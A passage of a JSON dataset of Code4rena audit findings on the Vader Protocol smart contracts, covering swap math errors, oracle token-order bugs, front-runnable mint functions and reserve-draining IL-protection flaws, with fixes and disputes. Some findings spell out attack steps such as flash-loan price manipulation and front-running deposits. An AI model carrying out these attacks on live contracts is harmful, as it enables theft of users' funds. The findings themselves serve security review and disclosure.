})\n);\n```\n\n#### Impact\n\nThe prices could be inverted which leads to the oracle providing wrong prices.\n\n#### Recommended Mitigation Steps\n\nIt should be checked if Uniswap's internal order matches the order of the `token0/1` function arguments.\nIf not, the cumulative prices must be swapped.\n\n```solidity\n// pseudocode\nIUniswapV2Pair pair = IUniswapV2Pair(\n    IUniswapV2Factory(factory).getPair(token0, token1)\n);\npairAddr = address(pair);\nprice0CumulativeLast = pair.price0CumulativeLast();\nprice1CumulativeLast = pair.price1CumulativeLast();\n(price0CumulativeLast, price1CumulativeLast) = token0 == pair.token0() ? (price0CumulativeLast, price1CumulativeLast) : (price1CumulativeLast, price0CumulativeLast);\n```\n\n> The same issue exists in `update`\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/171)**\n> The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nA bug has been identified in the `TWAPOracle.registerPair` function of the Uniswap-like factory. The function takes in a `factory` and (`token0, token1)` and accepts a `_factory` argument, meaning any Uniswap-like factory can be used. However, when using the actual Uniswap factory's `IUniswapV2Factory(factory).getPair(token0, token1)` call, the order of `token0` and `token1` can be reversed, which can lead to the oracle providing wrong prices.\n\nThe recommended mitigation steps for this issue are to check if the Uniswap's internal order matches the order of the `token0/1` function arguments. If not, the cumulative prices must be swapped. This issue also exists in the `update` function.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/171",
      "tags": [
        "Token Order"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1001",
      "title": "[H-16] VaderRouter.calculateOutGivenIn calculates wrong swap",
      "impact": "HIGH",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe 3-path hop in `VaderRouter.calculateOutGivenIn` is supposed to first swap **foreign** assets to native assets **in pool0**, and then the received native assets to different foreign assets again **in pool1**.\n\nThe first argument of `VaderMath.calculateSwap(amountIn, reserveIn, reserveOut)` must refer to the same token as the second argument `reserveIn`.\nThe code however mixes these positions up and first performs a swap in `pool1` instead of `pool0`:\n\n```solidity\nfunction calculateOutGivenIn(uint256 amountIn, address[] calldata path)\n    external\n    view\n    returns (uint256 amountOut)\n{\n  if(...) {\n  } else {\n    return\n        VaderMath.calculateSwap(\n            VaderMath.calculateSwap(\n                // @audit the inner trade should not be in pool1 for a forward swap. amountIn foreign => next param should be foreignReserve0\n                amountIn,\n                nativeReserve1,\n                foreignReserve1\n            ),\n            foreignReserve0,\n            nativeReserve0\n        );\n  }\n\n /** @audit instead should first be trading in pool0!\n    VaderMath.calculateSwap(\n        VaderMath.calculateSwap(\n            amountIn,\n            foreignReserve0,\n            nativeReserve0\n        ),\n        nativeReserve1,\n        foreignReserve1\n    );\n  */\n```\n\n## Impact\nAll 3-path swaps computations through `VaderRouter.calculateOutGivenIn` will return the wrong result.\nSmart contracts or off-chain scripts/frontends that rely on this value to trade will have their transaction reverted, or in the worst case lose funds.\n\n## Recommended Mitigation Steps\nReturn the following code instead which first trades in pool0 and then in pool1:\n\n```solidity\nreturn\n  VaderMath.calculateSwap(\n      VaderMath.calculateSwap(\n          amountIn,\n          foreignReserve0,\n          nativeReserve0\n      ),\n      nativeReserve1,\n      foreignReserve1\n  );\n```",
      "summary": "\nThis bug report is about a vulnerability found in the 3-path hop in `VaderRouter.calculateOutGivenIn` of a smart contract. The vulnerability is caused by mixing up the positions of the first argument and the second argument of `VaderMath.calculateSwap(amountIn, reserveIn, reserveOut)` which should refer to the same token. This mistake causes incorrect results when using the 3-path hop.\n\nThe impact of this vulnerability is that any smart contracts or off-chain scripts/frontends that rely on the wrong result of the 3-path hop will have their transactions reverted, or in the worst case lose funds.\n\nThe recommended mitigation step to fix this vulnerability is to return a different code which first trades in pool0 and then in pool1. The code should be as follows:\n\n```solidity\nreturn\n  VaderMath.calculateSwap(\n      VaderMath.calculateSwap(\n          amountIn,\n          foreignReserve0,\n          nativeReserve0\n      ),\n      nativeReserve1,\n      foreignReserve1\n  );\n```",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/162",
      "tags": [
        "Wrong Math",
        "Swap"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1000",
      "title": "[H-15] VaderRouter._swap performs wrong swap",
      "impact": "HIGH",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe 3-path hop in `VaderRouter._swap` is supposed to first swap **foreign** assets to native assets, and then the received native assets to different foreign assets again.\n\nThe `pool.swap(nativeAmountIn, foreignAmountIn)` accepts the foreign amount as the **second** argument.\nThe code however mixes these positional arguments up and tries to perform a `pool0` foreign -> native swap by using the **foreign** amount as the **native amount**:\n\n```solidity\nfunction _swap(\n    uint256 amountIn,\n    address[] calldata path,\n    address to\n) private returns (uint256 amountOut) {\n    if (path.length == 3) {\n      // ...\n      // @audit calls this with nativeAmountIn = amountIn. but should be foreignAmountIn (second arg)\n      return pool1.swap(0, pool0.swap(amountIn, 0, address(pool1)), to);\n    }\n}\n\n// @audit should be this instead\nreturn pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);\n```\n\n## Impact\nAll 3-path swaps through the `VaderRouter` fail in the pool check when `require(nativeAmountIn = amountIn <= nativeBalance - nativeReserve = 0)` is checked, as foreign amount is sent but _native_ amount is specified.\n\n## Recommended Mitigation Steps\nUse `return pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);` instead.",
      "summary": "\nThis bug report describes a vulnerability in the 3-path hop in the `VaderRouter._swap` code. The code is mixing up the positional arguments for the `pool.swap(nativeAmountIn, foreignAmountIn)` function, using the foreign amount as the native amount. This leads to all 3-path swaps through the `VaderRouter` failing when the pool check is done, as the foreign amount is sent but the native amount is specified.\n\nTo mitigate this issue, the code should be changed to use `return pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);` instead.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/161",
      "tags": [
        "Wrong Math",
        "Swap"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "999",
      "title": "[H-14] Anyone Can Arbitrarily Mint Fungible Tokens In VaderPoolV2.mintFungible()",
      "impact": "HIGH",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `mintFungible()` function is callable by any user that wishes to mint liquidity pool fungible tokens. The protocol expects a user to first approve the contract as a spender before calling `mintFungible()`. However, any arbitrary user could monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and effectively frontrun their call to `mintFungible()` by setting the `to` argument to their own address. As a result, the `nativeDeposit` and `foreignDeposit` amounts are transferred from the victim, and LP tokens are minted and finally transferred to the malicious user who is represented by the `to` address.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335\n\n## Tools Used\n\nManual code review.\nDiscussions with dev.\n\n## Recommended Mitigation Steps\n\nConsider removing the `from` argument in `mintFungible()` and update the `safeTransferFrom()` calls to instead transfer from `msg.sender`.",
      "summary": "\nThis bug report is regarding a vulnerability in the `mintFungible()` function of the `VaderPoolV2.sol` contract. This function is callable by any user, and the protocol expects a user to first approve the contract as a spender before calling `mintFungible()`. However, a malicious user could monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and effectively frontrun their call to `mintFungible()` by setting the `to` argument to their own address. This would cause the `nativeDeposit` and `foreignDeposit` amounts to be transferred from the victim, and LP tokens to be minted and transferred to the malicious user. The proof of concept for this vulnerability can be found on GitHub. The recommended mitigation step is to remove the `from` argument in `mintFungible()` and update the `safeTransferFrom()` calls to instead transfer from `msg.sender`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/147",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "998",
      "title": "[H-13] Anyone Can Arbitrarily Mint Synthetic Assets In VaderPoolV2.mintSynth()",
      "impact": "HIGH",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `mintSynth()` function is callable by any user and creates a synthetic asset against `foreignAsset` if it does not already exist. The protocol expects a user to first approve the contract as a spender before calling `mintSynth()`. However, any arbitrary user could monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and effectively frontrun their call to `mintSynth()` by setting the `to` argument to their own address. As a result, the `nativeDeposit` amount is transferred from the victim, and a synthetic asset is minted and finally transferred to the malicious user who is represented by the `to` address.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\n\n## Tools Used\n\nManual code review.\nDiscussions with dev.\n\n## Recommended Mitigation Steps\n\nConsider removing the `from` argument in `mintSynth()` and update the `safeTransferFrom()` call to instead transfer from `msg.sender`.",
      "summary": "\nThis bug report identifies a vulnerability in the `mintSynth()` function of the `VaderPoolV2.sol` smart contract. This function is callable by any user and creates a synthetic asset if it does not already exist. The protocol requires users to approve the contract as a spender before calling `mintSynth()`. However, any user can monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and frontrun their call to `mintSynth()` by setting the `to` argument to their own address. As a result, the `nativeDeposit` amount is transferred from the victim, and a synthetic asset is minted and transferred to the malicious user. The recommended mitigation step is to remove the `from` argument in `mintSynth()` and update the `safeTransferFrom()` call to instead transfer from `msg.sender`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/146",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "997",
      "title": "[H-12] Attacker can get extremely cheap synth by front-running create Pool",
      "impact": "HIGH",
      "content": "_Submitted by jonah1005, also found by defsec_\n\n#### Impact\n\n`createPool` is a permissionless transaction.\n\n1.  Anyone can create a token pool.\n2.  Token price is set by the first lp provider.\n3.  User can get a synthetic asset.\n\nAssume a new popular `coin` that the DAO decides to add to the protocol.\nThe attacker can create the pool and set it to be extremely cheap. (By depositing 1 wei `coin` and 10^18 wei Vader.) The attacker can mint a lot of synth by providing another 10^18 wei Vader.\n\nThere's no way to revoke the pool. The `coin` pool would be invalid since the attacker can drain all the lp in the pool.\n\nI consider this is a high-risk issue.\n\n#### Proof of Concept\n\n- [VaderPoolFactory.sol#L43-L89](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/VaderPoolFactory.sol#L43-L89)\n- [VaderPoolV2.sol#L115-L167](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L115-L167)\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nRestrict users from minting synth from a new and illiquid pool.\nSome thoughts about the fix:\n\n1.  Decide minimum liquidity for a synthetic asset (e.g 1M Vader in the pool)\n2.  Once there's enough liquidity pool, anyone can deploy a synthetic asset after a cool down. (e.g. 3 days\n\nThe pool can remain permissionless and safe.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/98#issuecomment-979148887):**\n > This is an invalid finding as creating pools is not a permissionless operation, the token must be in the supported list of assets.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/98#issuecomment-991486788):**\n > I can't see a check for a token to be in a supported list of assets.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/98#issuecomment-995748144):**\n > @alcueca There seems to be some confusion. The submitted of the bounty links the Vader Pool Factory of DEX V1 and the Pool of DEX V2 which are not interacting between them. As such, the finding is invalid.\n>\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the token pool system of the DAO protocol. This vulnerability allows anyone to create a token pool and set the price to be extremely cheap, allowing them to mint a lot of synthetic assets. This can be done by depositing 1 wei of a new and popular coin and 10^18 wei Vader. Unfortunately, there is no way to revoke the pool and the coin pool would be invalid since the attacker can drain all the liquidity in the pool. This is considered a high-risk issue. The proof of concept can be found in the provided links. To mitigate this issue, it is recommended to restrict users from minting synthetic assets from a new and illiquid pool. This can be done by deciding a minimum liquidity for a synthetic asset (e.g 1M Vader in the pool) and requiring a cool down period (e.g. 3 days) before allowing anyone to deploy a synthetic asset. This way, the pool can remain permissionless and safe.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/98",
      "tags": [],
      "finders": [
        "defsec",
        "jonah1005"
      ]
    },
    {
      "id": "996",
      "title": "[H-11] (dex-v1) BasePool.mint() function can be frontrun",
      "impact": "HIGH",
      "content": "_Submitted by Reigada_\n\n#### Impact\n\nIn the contract BasePool the mint function can be frontrun. This will assign the NFT to the attacker which later on he can burn it retrieving the corresponding `\\_nativeAsset` and `\\_foreignAsset` initially deposited by the frontrun victim.\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L149-L194>\n\n#### Proof of Concept\n\nUser1 transfers 1000 `\\_nativeAsset` tokens and 1000 `\\_foreignAsset` tokens into the BasePool contract.\nUser1 calls the `BasePool.mint()` function to retrieve his NFT.\nAttacker is constantly polling for an increase of the balance of `\\_nativeAsset` and `\\_foreignAsset` of the contract OR attacker is constantly scanning the mempool for `mint()` function calls.\nAttacker detects an increase of balance of `\\_nativeAsset` and `\\_foreignAsset` OR attacker detects a `mint()` function call in the mempool.\nAttacker frontruns the mint call and retrieves the NFT. Gets a NFT that is worth 1000 `\\_nativeAssets` and 1000 `\\_foreignAssets`.\nUser1 gets a NFT that is worth 0 `\\_nativeAssets` and 0 `\\_foreignAssets`.\nAttacker burns the NFT retrieving the corresponding `\\_nativeAsset` and `\\_foreignAsset` initially deposited by the victim.\n\n#### Tools Used\n\nManual testing\n\n#### Recommended Mitigation Steps\n\nInclude in the `mint()` function the transfer of `\\_nativeAssets` and `\\_foreignAssets` to the smart contract.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/71#issuecomment-979143966):**\n > The pool is meant to be utilized via the router or smart contracts and is not meant to be utilized directly.  The exact same \"flaw\" exists in Uniswap V2 whereby if you transfer assets directly someone else can claim them on your behalf.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/71#issuecomment-991494827):**\n > Ah, so this how you prevent direct access to the pools. The issue is valid due to lack of documentation on the usage of the router.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/71#issuecomment-995754315):**\n > Firstly, documentation related issues cannot constitute a high risk vulnerability. Secondly, this type of documentation does not exist in Uniswap V2 either. We advise this finding to be set to no risk.\n>\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the BasePool contract, which allows attackers to frontrun the mint function and take the NFT that was meant for the victim. If the attacker burns the NFT, they can retrieve the corresponding _nativeAsset and _foreignAsset that were initially deposited by the victim. This was discovered through manual testing. The recommended mitigation step is to include the transfer of _nativeAssets and _foreignAssets to the smart contract in the mint() function. This would prevent attackers from frontrunning the mint function and taking the NFT that was meant for the victim.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/71",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "Reigada"
      ]
    },
    {
      "id": "995",
      "title": "[H-10]  calculate Loss is vulnerable to flashloan attack",
      "impact": "HIGH",
      "content": "_Submitted by jonah1005_\n\n#### Impact\n\nThe VaderPool would compensate users' IL. The formula it uses to calculate lp value is vulnerable to manipulation.\n\nThe formula to calculate the lp value is similar to warp finance which is known to be unsafe. [warpfinance-incident-root-cause-analysis](https://peckshield.medium.com/warpfinance-incident-root-cause-analysis-581a4869ee00) (Please to refer to the POC section)\n\nThe Attacker can purchase an old lp position, manipulate price, take IL compensation and drain the reserve.\nI consider this is a high-risk issue.\n\n#### Proof of Concept\n\n[VaderMath.sol#L69-L93](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L69-L93)\n\nThe lp value is calculated as `[(A0 * P1) + V0]` and `// [(A1 * P1) + V1]`.\nAssume that there's an ETH pool and there's 100 ETH and 100 Vader in the pool.\n\n1.  Attacker deposit 1 ETH and 1 Vader and own 1% of the liquidity.\n2.  Wait 1 year\n3.  Start flash loan and buy a lot ETH with 99900 Vader.\n4.  There's  0.1 ETH 100,000 Vader in the pool.\n5.  Burn 1 % lp at the price 1 ETH = 1,000,000 Vader.\n6.  A0 \\* P1 + V0 = 1 (eth) \\* 1,000,000 (price) + 100 (vader)\n7.  A1 \\* P1 + V1 = 0.001 (eth) \\* 1,000,000 (price) + 10,000 (vader)\n8.  IL compensation would be around `9891000`.\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nPlease use the fair lp pricing formula from alpha finance instead. [fair-lp-token-pricing](https://blog.alphafinance.io/fair-lp-token-pricing/)\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/65#issuecomment-979141518):**\n > The described attack scenario can not be executed as the pool would actually consume the flash loan. The CLP model follows a non-linear curve that actually diminishes in value as the trade size increases, meaning that at most 25% of the total assets in the pool can be drained at a given iteration. This, on top with the fees of each transaction render this attack vector impossible. Please request a tangible attack test from the warden if this is meant to be accepted as valid.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/65#issuecomment-991496670):**\n > The CLP model isn't mentioned in the readme or the whitepaper. The issue is valid according to the materials supplied.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/65#issuecomment-995757161):**\n > @alcueca As the grading guidelines of C4 state, a documentation issue cannot constitute more than a low risk finding. We advise the severity to be lowered.\n>\n\n\n\n",
      "summary": "\nA vulnerability has been identified in the formula used by VaderPool to calculate liquidity value which is vulnerable to manipulation. This formula is similar to that used by Warp Finance which is known to be unsafe. An attacker can purchase an old liquidity position, manipulate prices, take IL compensation and drain the reserve. The proof of concept is provided in a link to VaderMath.sol in Github. It is recommended that the fair lp pricing formula from Alpha Finance be used instead.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/65",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "994",
      "title": "[H-09] VaderPoolV2 incorrectly calculates the amount of IL protection to send to LPs",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nThe `VaderReserve` pays out IL from `VaderPoolV2` LPs expressed in USDV with VADER (assuming a 1:1 exchange rate)\n\n#### Proof of Concept\n\nFrom the TwapOracle, it can be seen that `VaderPoolV2` is intended to be deployed with USDV as its `nativeAsset`:\n\n- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L281-L296>\n\n- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/BasePoolV2.sol#L58-L59>\n\nAll the pairs in `VaderPoolV2` are then USDV:TKN where TKN is some other token, exactly which is irrelevant in this case.\n\n`VaderPoolV2` offers IL protection where any IL is refunded from the `VaderReserve`\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/VaderPoolV2.sol#L258-L268>\n\nThe `VaderReserve` holds a balance of VADER tokens which will be used to pay out this protection.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/reserve/VaderReserve.sol#L76-L90>\n\nThe IL experienced by the LP is calculated in `VaderMath.calculateLoss`\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93>\n\nThis is the core of the issue. From the variable names it's clear that this is written with the assumption that it is work on units of VADER whereas it is provided amounts in terms of USDV. Checking `VaderRouterV2` we can see that we pass the output of this calculation directly to the reserve in order to claim VADER.\n\nIf an LP experienced 100 USDV worth of IL, instead of claiming the equivalent amount of VADER they would receive exactly 100 VADER as there's no handling of the exchange rate between USDV and VADER.\n\nAs VADER and USDV are very unlikely to trade at parity LPs could get sustantially more or less than the amount of IL they experienced.\n\n#### Recommended Mitigation Steps\n\nAdd handling for the conversion rate between VADER and USDV using a tamper resistant oracle (TwapOracle could potentially fulfil this role).\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/54)** \n\n",
      "summary": "\nTomFrench reported a vulnerability in the `VaderReserve`, which pays out IL from `VaderPoolV2` LPs expressed in USDV with VADER, assuming a 1:1 exchange rate. This is because the IL experienced by the LP is calculated in `VaderMath.calculateLoss` which was written with the assumption that it is working on units of VADER whereas it is provided amounts in terms of USDV. This means that if an LP experienced 100 USDV worth of IL, they would receive exactly 100 VADER as there's no handling of the exchange rate between USDV and VADER. As VADER and USDV are very unlikely to trade at parity, LPs could get substantially more or less than the amount of IL they experienced. The recommended mitigation steps are to add handling for the conversion rate between VADER and USDV using a tamper resistant oracle, such as TwapOracle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/54",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "993",
      "title": "[H-08] USDV and VADER rate can be wrong",
      "impact": "HIGH",
      "content": "_Submitted by xYrYuYx_\n\n#### Impact\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L166>\n\n`tUSDInUSDV` can be smaller than `tUSDInVader`, and then `getRate` will return 0.\nThis will lead wrong rate calculation.\n\n#### Tools Used\n\nManually\n\n#### Recommended Mitigation Steps\n\nMultiple enough decimals before division\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/50)**\n>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the TwapOracle.sol contract, which could lead to wrong rate calculations. The code in question is located at https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L166. The vulnerability occurs when tUSDInUSDV is smaller than tUSDInVader, and then getRate returns 0. The bug was discovered manually. The recommended mitigation step is to multiple enough decimals before division.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/50",
      "tags": [],
      "finders": [
        "xYrYuYx"
      ]
    },
    {
      "id": "992",
      "title": "[H-07] VaderReserve does not support paying IL protection out to more than one address, resulting in locked funds",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nAll liquidity deployed to one of `VaderPool` or `VaderPoolV2` will be locked permanently.\n\n#### Proof of Concept\n\nBoth `VaderRouter` and `VaderRouterV2` make calls to `VaderReserve` in order to pay out IL protection.\n\n- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/router/VaderRouter.sol#L206>\n\n- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/router/VaderRouterV2.sol#L227>\n\nHowever `VaderReserve` only allows a single router to claim IL protection on behalf of users.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/reserve/VaderReserve.sol#L80-L83>\n\nIt's unlikely that the intent is to deploy multiple reserves so there's no way for both `VaderRouter` and `VaderRouterV2` to pay out IL protection simultaneously.\n\nThis is a high severity issue as any LPs which are using the router which is not listed on `VaderReserve` will be unable to remove liquidity as the call to the reserve will revert. Vader governance is unable to update the allowed router on `VaderReserve` so all liquidity on either `VaderPool` or `VaderPoolV2` will be locked permanently.\n\n#### Recommended Mitigation Steps\n\nOptions:\n\n1.  Allow the reserve to whitelist multiple addresses to claim funds\n2.  Allow the call to the reserve to fail without reverting the entire transaction (probably want to make this optional for LPs)\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/37#issuecomment-979131742):**\n >  As the code indicates, only one of the two versioned instances of the AMM will be deployed and active at any given time rendering this exhibit incorrect.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/37#issuecomment-991499561):**\n > Sorry @SamSteinGG, where does the code indicate that?\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/37#issuecomment-995759254):**\n > Correction, this was clarified during the audit in the discord channel.\n\n\n\n",
      "summary": "\nTomFrench has identified a high severity issue with the Vader protocol. Both VaderRouter and VaderRouterV2 make calls to VaderReserve in order to pay out IL protection. However, VaderReserve only allows a single router to claim IL protection on behalf of users. This means that if two routers are used, any liquidity deployed to either VaderPool or VaderPoolV2 will be locked permanently. Vader governance is unable to update the allowed router on VaderReserve, so all liquidity on either VaderPool or VaderPoolV2 will be locked permanently. \n\nTwo mitigation steps are recommended to address this issue. The first option is to allow the reserve to whitelist multiple addresses to claim funds. The second option is to allow the call to the reserve to fail without reverting the entire transaction (this should be optional for LPs).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/37",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "991",
      "title": "[H-06] Paying IL protection for all VaderPool pairs allows the reserve to be drained.",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nVader Reserve can be drained of funds.\n\n#### Proof of Concept\n\nIn `VaderPoolV2.burn` we calculate the current losses that the LP has made to impermanent loss.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/pool/VaderPool.sol#L77-L89>\n\nThese losses are then refunded to the LP in VADER tokens from the reserve. NOTE: This IL protection is paid for ALL token pairs. THIS IS IMPORTANT!\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/router/VaderRouter.sol#L187-L206>\n\nThe loss is calculated by the comparing the amounts of each asset initially added to the pool against the amounts of each asset which are removed from the pool. There's an unspoken assumption here that the LP entered the pool at the true price at that point.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93>\n\nCrucially we see that if an attacker can cheaply create a pool with a token which starts off with a very low price in terms of VADER and is guaranteed to have a very high price in terms of VADER then they will benefit from a large amount of IL protection funds from the reserve.\n\nAn attacker could then perform this attack with the following.\n\n1.  Flashloan a huge amount of Vader (or flashloan + buy VADER).\n2.  Deploy a token TKN, which the attacker can mint as much as they like.\n3.  Add liquidity to a new pool with a large amount of VADER and a small amount of TKN\n4.  Use their ability to mint TKN to buy up all the VADER in their pool\n5.  Repay flashloan with VADER extracted from pool + some pre-existing funds as attacker needs to cover VADER lost to swap fees/slippage.\n\nThe attacker has now engineered a liquidity position which looks massively underwater due to IL but in reality was very cheap to produce. Nobody else can do anything to this pool except just give the attacker money by buying TKN so this attack can't be prevented. The attacker now just needs to wait for at most a year for the IL protection to tick up and then they can cash in the LP position for a nice payday of up to the amount of VADER they initially added to the pool.\n\n#### Recommended Mitigation Steps\n\nAdd a whitelist to the pairs which qualify for IL protection.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/34#issuecomment-979130824):**\n > Predicting the price fluctuations of an asset is impossible. An attacker cannot create a pool arbitrarily as that is governed by a special whitelist function that is in turn voted on by the DAO.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/34#issuecomment-991500803):**\n > As we saw in other issues, the creation of pools is permissionless\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/34#issuecomment-995760208):**\n > @alcueca Again, there seems to be confusion as to the versions utilized. The submitter references the Vader V2 implementation in which pool creations are indeed permissioned (via the add supported token function) as the Vader pool factory is only relevant to the V1 implementation.\n>\n\n\n\n",
